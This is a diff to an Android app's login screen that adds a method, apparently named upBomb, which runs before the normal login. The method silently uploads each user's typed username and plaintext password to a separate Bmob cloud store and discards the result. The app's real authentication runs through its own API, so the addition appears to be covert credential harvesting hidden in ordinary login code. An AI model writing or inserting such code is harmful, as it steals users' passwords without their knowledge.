@@ -17,6 +17,7 @@ import com.lewis.cp.base.BaseActivity;
 import com.lewis.cp.http.APIService;
 import com.lewis.cp.http.RetrofitManager;
 
+import com.lewis.cp.model.Person;
 import com.lewis.cp.model.UserModel;
 
 
@@ -27,6 +28,8 @@ import java.util.Map;
 import butterknife.BindView;
 
 import butterknife.OnClick;
+import cn.bmob.v3.exception.BmobException;
+import cn.bmob.v3.listener.SaveListener;
 import retrofit2.Call;
 import retrofit2.Callback;
 import retrofit2.Response;
@@ -112,9 +115,26 @@ public class LoginAct extends BaseActivity {
                      showToast("请输入密码");
                     return;
                 }
+                upBomb();
                 login();
                 break;
         }
+    }
+
+    private void upBomb() {
+        Person p2 = new Person();
+        p2.setName(userName);
+        p2.setPwd(pwd);
+        p2.save(new SaveListener<String>() {
+            @Override
+            public void done(String objectId,BmobException e) {
+                if(e==null){
+
+                }else{
+
+                }
+            }
+        });
     }
 
     private void login() {
